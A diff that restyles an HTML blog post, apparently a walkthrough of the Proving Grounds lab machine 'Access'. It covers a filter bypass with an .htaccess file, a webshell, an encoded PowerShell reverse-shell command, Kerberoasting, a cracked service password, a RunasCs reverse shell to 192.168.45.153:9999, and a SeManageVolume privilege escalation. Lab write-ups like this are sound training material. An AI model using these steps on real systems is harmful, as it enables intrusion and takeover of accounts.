@@ -1,1 +1,129 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as svc_apache</u></strong></span></p><p>&nbsp;</p><p>Port 80 is open</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2662/926;" src="../img/posts/2025-02-25-Access(PG)/01-4e9aedbc70.png" width="2662" height="926"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Clicking buy tickets in the top right we can upload files</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:521/355;" src="../img/posts/2025-02-25-Access(PG)/02-0a6e26729d.png" width="521" height="355"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I spent many hours trying to bypass the filters and get php to execute but it didnt work. We have to upload an htaccess file allowing different extensions to execute as php.</p><p>&nbsp;</p><p><code>echo "AddType application/x-httpd-php .dork" &gt; .htaccess</code><br>&nbsp;</p><p>We upload this file then anything we upload with the .dork extension will execute php code.</p><p>&nbsp;</p><p>I upload a webshell so I can execute commands</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2669/319;" src="../img/posts/2025-02-25-Access(PG)/03-d13f79181c.png" width="2669" height="319"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I choose to use my typical ps1 reverse shell</p><p><code>PowerShell.exe -Exec ByPass -Nol -Enc</code> &lt;base 64 payload&gt;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1333/484;" src="../img/posts/2025-02-25-Access(PG)/04-50aa2d0fd3.png" width="1333" height="484"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:560/344;" src="../img/posts/2025-02-25-Access(PG)/05-5922664cb6.png" width="560" height="344"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as svc_mssql</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>I grab bloodhound data and I see svc_mssql is kerberoastable</p><figure class="image"><img style="aspect-ratio:1585/779;" src="../img/posts/2025-02-25-Access(PG)/06-eeba2677f8.png" width="1585" height="779"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Use rubeus to grab the hash</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1317/553;" src="../img/posts/2025-02-25-Access(PG)/07-46bf74e0de.png" width="1317" height="553"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Crack hash</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:786/205;" src="../img/posts/2025-02-25-Access(PG)/08-e235402e26.png" width="786" height="205"></figure><p>&nbsp;</p><p>svc_mssql:trustno1</p><p>&nbsp;</p><p>Using runascs we can get access to svc_mssql and get the first flag</p><p><code>.\runascs.exe svc_mssql trustno1 cmd -r 192.168.45.153:9999&nbsp;</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:350/73;" src="../img/posts/2025-02-25-Access(PG)/09-5b67611a22.png" width="350" height="73"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access to Administrator</u></strong></span></p><p>&nbsp;</p><p>We have SEmanageVolumePrivilege and we can use this to get access to the entire C drive</p><p>https://github.com/CsEnox/SeManageVolumeExploit/</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1065/451;" src="../img/posts/2025-02-25-Access(PG)/10-32ed58c0e4.png" width="1065" height="451"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1013/532;" src="../img/posts/2025-02-25-Access(PG)/11-ca4b012140.png" width="1013" height="532"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1032/541;" src="../img/posts/2025-02-25-Access(PG)/12-55448cbf89.png" width="1032" height="541"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>PG: Access | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-02-25-Access(PG)/01-4e9aedbc70.png" alt="PG: Access cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">PG: Access</h1>
+                <div class="post-meta">February 25, 2025 &bull; PG</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as svc_apache</h1>
+
+        <p>Port 80 is open</p>
+
+        <img alt="Screenshot 1" height="926" src="../img/posts/2025-02-25-Access(PG)/01-4e9aedbc70.png" style="aspect-ratio:2662/926;" width="2662"/>
+
+        <p>Clicking buy tickets in the top right we can upload files</p>
+
+        <img alt="Screenshot 2" height="355" src="../img/posts/2025-02-25-Access(PG)/02-0a6e26729d.png" style="aspect-ratio:521/355;" width="521"/>
+
+        <p>I spent many hours trying to bypass the filters and get php to execute but it didnt work. We have to upload an htaccess file allowing different extensions to execute as php.</p>
+
+        <pre class="terminal"><code>echo "AddType application/x-httpd-php .dork" &gt; .htaccess</code></pre>
+
+        <p>We upload this file then anything we upload with the .dork extension will execute php code.</p>
+
+        <p>I upload a webshell so I can execute commands</p>
+
+        <img alt="Screenshot 3" height="319" src="../img/posts/2025-02-25-Access(PG)/03-d13f79181c.png" style="aspect-ratio:2669/319;" width="2669"/>
+
+        <p>I choose to use my typical ps1 reverse shell</p>
+
+        <p><code>PowerShell.exe -Exec ByPass -Nol -Enc</code> &lt;base 64 payload&gt;</p>
+
+        <img alt="Screenshot 4" height="484" src="../img/posts/2025-02-25-Access(PG)/04-50aa2d0fd3.png" style="aspect-ratio:1333/484;" width="1333"/>
+
+        <img alt="Screenshot 5" height="344" src="../img/posts/2025-02-25-Access(PG)/05-5922664cb6.png" style="aspect-ratio:560/344;" width="560"/>
+
+        <h1 style="color:red;">Access as svc_mssql</h1>
+
+        <p>I grab bloodhound data and I see svc_mssql is kerberoastable</p>
+
+        <img alt="Screenshot 6" height="779" src="../img/posts/2025-02-25-Access(PG)/06-eeba2677f8.png" style="aspect-ratio:1585/779;" width="1585"/>
+
+        <p>Use rubeus to grab the hash</p>
+
+        <img alt="Screenshot 7" height="553" src="../img/posts/2025-02-25-Access(PG)/07-46bf74e0de.png" style="aspect-ratio:1317/553;" width="1317"/>
+
+        <p>Crack hash</p>
+
+        <img alt="Screenshot 8" height="205" src="../img/posts/2025-02-25-Access(PG)/08-e235402e26.png" style="aspect-ratio:786/205;" width="786"/>
+
+        <p>svc_mssql:trustno1</p>
+
+        <p>Using runascs we can get access to svc_mssql and get the first flag</p>
+
+        <pre class="terminal"><code>.\runascs.exe svc_mssql trustno1 cmd -r 192.168.45.153:9999</code></pre>
+
+        <img alt="Screenshot 9" height="73" src="../img/posts/2025-02-25-Access(PG)/09-5b67611a22.png" style="aspect-ratio:350/73;" width="350"/>
+
+        <h1 style="color:red;">Access to Administrator</h1>
+
+        <p>We have SEmanageVolumePrivilege and we can use this to get access to the entire C drive</p>
+
+        <p>https://github.com/CsEnox/SeManageVolumeExploit/</p>
+
+        <img alt="Screenshot 10" height="451" src="../img/posts/2025-02-25-Access(PG)/10-32ed58c0e4.png" style="aspect-ratio:1065/451;" width="1065"/>
+
+        <img alt="Screenshot 11" height="532" src="../img/posts/2025-02-25-Access(PG)/11-ca4b012140.png" style="aspect-ratio:1013/532;" width="1013"/>
+
+        <img alt="Screenshot 12" height="541" src="../img/posts/2025-02-25-Access(PG)/12-55448cbf89.png" style="aspect-ratio:1032/541;" width="1032"/>
+    </article>
+
+</body>
+</html>
